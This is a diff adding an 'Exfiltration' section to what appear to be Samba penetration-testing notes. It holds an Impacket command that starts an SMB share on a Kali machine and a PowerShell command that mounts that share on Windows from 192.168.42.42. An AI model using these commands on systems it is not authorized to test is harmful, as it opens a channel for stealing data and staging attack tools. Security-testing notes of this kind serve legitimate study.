@@ -99,3 +99,13 @@ Sometimes nmap doesn’t show the version of Samba in the remote host, if this h
 
 ![image](https://user-images.githubusercontent.com/37288034/80310413-a2be9d00-8800-11ea-82b8-21dc0e059a1e.png)
 
+##### Exfiltration
+###### Samba
+Generate a samba server with Impacket:
+
+impacket-smbserver tools /home/kali/tools
+Mount in Windows
+Mounting it in Windows with Powershell:
+~~~
+New-PSDrive -Name "tools" -PSProvider "Filesystem" -Root "\\192.168.42.42\tools"
+~~~
